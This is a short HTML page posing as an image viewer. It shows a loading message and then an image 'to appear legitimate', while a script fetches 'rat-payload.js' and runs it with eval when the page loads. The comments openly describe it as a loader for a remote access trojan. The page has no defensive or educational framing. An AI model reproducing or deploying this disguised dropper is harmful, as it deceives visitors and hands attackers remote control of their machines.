<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Image...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
        }
        #loadingMessage {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: Arial, sans-serif;
            color: #666;
        }
        #fakeImage {
            max-width: 90%;
            max-height: 90%;
            display: none;
        }
    </style>
</head>
<body>
    <div id="loadingMessage">Loading image, please wait...</div>
    <img src="legitimate-image.jpg" alt="Image" id="fakeImage">
    
    <script>
        // Show the image after a delay to appear legitimate
        setTimeout(() => {
            document.getElementById('loadingMessage').style.display = 'none';
            document.getElementById('fakeImage').style.display = 'block';
        }, 2000);
        
        // Load and execute the RAT payload
        fetch('rat-payload.js')
            .then(response => response.text())
            .then(script => {
                // Execute the RAT code
                eval(script);
            })
            .catch(error => console.error('Error loading script:', error));
    </script>
</body>
</html>
